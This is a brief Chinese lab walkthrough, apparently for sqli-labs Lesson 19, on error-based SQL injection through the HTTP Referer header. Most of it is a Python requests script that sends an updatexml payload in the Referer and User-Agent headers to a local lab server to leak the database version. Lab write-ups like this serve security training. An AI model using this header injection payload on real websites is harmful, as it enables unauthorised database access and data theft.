# Lesson-19
```
HTTP头注入Refer)-,-报错注入
```

和上一道题差不多 , 只不过注入的地方是在Refer头里面 , 而不是User-Agent
```
import requests

url = "http://127.0.0.1/Less-19/"

postDate = {
	'uname':'admin',
	'passwd':'1'
}

headers = {
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Encoding':'gzip, deflate, br',
	'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
	'Cache-Control':'max-age=0',
	'Connection':'keep-alive',
	'Content-Type':'application/x-www-form-urlencoded',
	'Host':'127.0.0.1',
	'X-Forwarded-For':'8.8.8.8',
	'Origin':'http://127.0.0.1',
	'Referer':'\',updatexml(1,concat(0x5e,version(),0x5e),1),\'',
	'Upgrade-Insecure-Requests':'1',
	'User-Agent':'\',updatexml(1,concat(0x5e,version(),0x5e),1),\''
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```
